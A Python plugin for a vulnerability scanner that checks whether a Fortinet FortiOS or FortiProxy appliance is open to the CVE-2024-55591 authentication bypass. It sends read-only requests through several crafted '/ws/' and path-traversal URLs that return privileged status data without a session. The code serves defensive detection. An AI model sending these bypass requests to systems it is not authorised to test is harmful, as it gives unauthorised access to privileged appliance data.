"""CVE-2024-55591 — Fortinet FortiOS / FortiProxy authentication bypass.

FortiOS and FortiProxy ship a Node.js websocket module behind the management
HTTP/HTTPS interface. An unauthenticated attacker who crafts a websocket-style
request to the internal ``/ws/`` namespace can reach privileged ``jsconsole``
API handlers without ever presenting a session — yielding super-admin access
(create admins, mutate config, harvest credentials). Fortinet confirmed active
exploitation; CISA added the CVE to the KEV catalog in January 2025 (CVSS 9.6).

This is a *different* vulnerability from CVE-2025-64446 (FortiWeb path
traversal): a different product line (FortiOS/FortiProxy vs FortiWeb), a
different mechanism (websocket-namespace auth bypass vs API path traversal),
and a different management surface.

This probe is BENIGN and read-only. It never performs the privileged action
behind the bypass (no admin creation, no config write). It only:

    1. GET /                          — and the well-known FortiOS login page to
                                        fingerprint the appliance (login title,
                                        ``Server`` header, Forti-specific markers).
    2. GET /api/v2/cmdb/system/status — the *authenticated* status endpoint. On a
                                        sane appliance this is 401/403 without a
                                        session token. This is the control.
    3. GET <ws-namespace>/.../system/status
                                      — the same status data reached through the
                                        websocket-namespace path the bypass
                                        abuses. If it returns 200 with status JSON
                                        while the direct path returned 401/403,
                                        the auth bypass is confirmed: we read
                                        privileged data without a session.

No data is modified. No admin is created. No configuration is changed.

Severity:
    * HIGH   — FortiOS/FortiProxy fingerprinted AND the websocket-namespace path
               returned privileged data (200 + status JSON) that the direct,
               authenticated path refused (401/403). The bypass is confirmed
               read-only.
    * MEDIUM — the host fingerprints as FortiOS/FortiProxy but the bypass could
               not be confirmed on this probe (patched, filtered, or a layout
               change) — a candidate worth a manual check.
    * none   — not a FortiOS/FortiProxy appliance, or the bypass path is
               correctly rejected and no privileged data leaked.

Candidate ports: 443 (primary mgmt HTTPS), 80, 8443, 10443 — the well-known
FortiOS/FortiProxy management HTTP-class ports.

[Worker decision: plugin filename is cve_2024_55591.py (underscores) because the
runner discovers plugins via importlib and module names cannot contain hyphens.
The canonical CVE id lives in metadata["vuln_id"], matching the existing
cve_2025_64446.py / cve_2024_23897.py convention.]
"""

from __future__ import annotations

from typing import Any

import httpx

from miasma.core import Finding, Target

metadata = {
    "vuln_id": "CVE-2024-55591",
    "name": "Fortinet FortiOS / FortiProxy authentication bypass (websocket namespace)",
    "description": (
        "Fortinet FortiOS / FortiProxy exposes an authentication bypass in the "
        "Node.js websocket module: an unauthenticated request crafted into the "
        "internal /ws/ namespace reaches privileged jsconsole API handlers "
        "without a session, granting super-admin access. Confirmed read-only by "
        "reaching the system/status endpoint through the websocket-namespace path "
        "that the direct, authenticated endpoint refuses without a session."
    ),
    "confidence": "high",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2024-55591",
        "https://www.fortiguard.com/psirt/FG-IR-24-535",
        "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
    ],
    # HTTP-class management ports for FortiOS/FortiProxy; also the fallback when
    # recon found none. port_hint is the canonical field the runner reads to skip
    # irrelevant plugins; default_ports is kept as the in-probe fallback alias.
    "port_hint": [443, 80, 8443, 10443],
    "service_hint": ["http", "https"],
    "default_ports": [443, 80, 8443, 10443],
}

# The direct, authenticated status endpoint. Without a session this is 401/403
# on a sane appliance — that refusal is the control we compare the bypass
# against, so a 200 via the websocket namespace is unambiguously a bypass.
_DIRECT_STATUS_PATH = "/api/v2/cmdb/system/status"

# Websocket-namespace paths that, on a vulnerable FortiOS/FortiProxy, route an
# unauthenticated request through the Node.js websocket module to the privileged
# status handler. We try a small ordered set of well-known shapes; all are
# read-only GETs against the inert status endpoint. The /ws/ prefix is what the
# bypass abuses to skip the session check.
_BYPASS_PATHS = (
    "/ws/api/v2/cmdb/system/status",
    "/ws/jsconsole/api/v2/cmdb/system/status",
    "/api/v2/cmdb/system/status;/ws",
    "/ws/..;/api/v2/cmdb/system/status",
)

# FortiOS / FortiProxy fingerprints. Any one in the Server header, a known
# cookie/marker, or the login page body marks the appliance (case-insensitive).
_FORTI_MARKERS = ("fortios", "fortiproxy", "fortigate", "fortinet")

# Status JSON returned by the privileged endpoint carries these keys; their
# presence proves we got privileged data back, not a generic error/landing page.
_STATUS_MARKERS = ("serial", "version", "http_method", "build")

# TLS ports where we should speak https.
_TLS_PORTS = (443, 8443, 10443)

_TIMEOUT = 5.0


def _candidate_ports(target: Target) -> list[int]:
    """Prefer recon-discovered open HTTP-ish ports; else the defaults."""
    open_ports = target.open_ports()
    if open_ports:
        http_like = [
            port
            for port in open_ports
            if "http" in target.service(port).get("name", "").lower()
            or port in metadata["default_ports"]
        ]
        return http_like or open_ports
    return list(metadata["default_ports"])


def _scheme(port: int) -> str:
    return "https" if port in _TLS_PORTS else "http"


def _get(url: str) -> httpx.Response | None:
    """Benign GET; returns None on any transport error."""
    try:
        return httpx.get(
            url,
            timeout=_TIMEOUT,
            verify=False,
            follow_redirects=False,
        )
    except httpx.HTTPError:
        return None


def _server_header(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    return resp.headers.get("server", "")


def _body(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return resp.text
    except (UnicodeDecodeError, httpx.HTTPError):
        return ""


def _is_forti(resp: httpx.Response | None) -> bool:
    """True when the response fingerprints a FortiOS/FortiProxy appliance.

    We look across the Server header, the Set-Cookie header (Forti appliances
    set product-specific cookies), and the response body (login page markers).
    """
    if resp is None:
        return False
    haystack = (
        _server_header(resp)
        + " "
        + resp.headers.get("set-cookie", "")
        + " "
        + _body(resp)
    ).lower()
    return any(marker in haystack for marker in _FORTI_MARKERS)


def _looks_like_status(resp: httpx.Response) -> bool:
    """True when the body looks like the privileged status JSON, not a stub."""
    body = _body(resp).lower()
    return any(marker in body for marker in _STATUS_MARKERS)


def probe(target: Target) -> Finding | None:
    medium_evidence: dict[str, Any] | None = None

    for port in _candidate_ports(target):
        base = f"{_scheme(port)}://{target.host}:{port}"

        # 1. Fingerprint: is this a FortiOS/FortiProxy appliance at all? Check the
        #    root and the well-known login page; either marker is enough.
        root = _get(f"{base}/")
        login = _get(f"{base}/login")
        forti = _is_forti(root) or _is_forti(login)
        if not forti:
            # Not a Forti host — never flag, even on odd responses.
            continue

        server = _server_header(root) or _server_header(login)

        # 2. Establish the control: the direct, authenticated status endpoint
        #    should refuse us (401/403) without a session. If it answers 200
        #    outright the appliance is wide open by misconfig, not this CVE —
        #    but a confirmed bypass is still the stronger signal, so we only
        #    treat a refusing direct path as a clean control.
        direct = _get(f"{base}{_DIRECT_STATUS_PATH}")
        direct_status = direct.status_code if direct is not None else None
        direct_refused = direct_status in (401, 403)

        # 3. Attempt to read privileged status data through the websocket
        #    namespace the bypass abuses.
        for path in _BYPASS_PATHS:
            resp = _get(f"{base}{path}")
            if resp is None:
                continue
            status = resp.status_code

            # Correctly rejected — keep trying other shapes / ports.
            if status in (401, 403, 404):
                continue

            if status == 200 and _looks_like_status(resp) and direct_refused:
                # Bypass confirmed: privileged data via the websocket namespace
                # that the direct path refused without a session.
                return Finding(
                    vuln_id=metadata["vuln_id"],
                    host=target.host,
                    confidence="high",
                    evidence={
                        "base_url": base,
                        "bypass_path": path,
                        "bypass_status": status,
                        "direct_path": _DIRECT_STATUS_PATH,
                        "direct_status": direct_status,
                        "server_header": server,
                    },
                    description=metadata["description"],
                )

            # Forti fingerprinted and a bypass path answered with a
            # non-401/403/404 status, but the bypass wasn't cleanly confirmed
            # (no status markers, or the direct path didn't refuse). Remember the
            # first such hit as a MEDIUM candidate; a confirmed HIGH on a later
            # path/port still wins.
            if medium_evidence is None:
                medium_evidence = {
                    "base_url": base,
                    "bypass_path": path,
                    "bypass_status": status,
                    "direct_path": _DIRECT_STATUS_PATH,
                    "direct_status": direct_status,
                    "server_header": server,
                    "note": (
                        "FortiOS/FortiProxy fingerprinted and a websocket-namespace "
                        "path returned a non-401/403/404 status, but the "
                        "authentication bypass was not confirmed (no privileged "
                        "status markers, or the direct endpoint did not refuse) — "
                        "manual check recommended."
                    ),
                }

    if medium_evidence is not None:
        return Finding(
            vuln_id=metadata["vuln_id"],
            host=target.host,
            confidence="medium",
            evidence=medium_evidence,
            description=metadata["description"],
        )

    return None
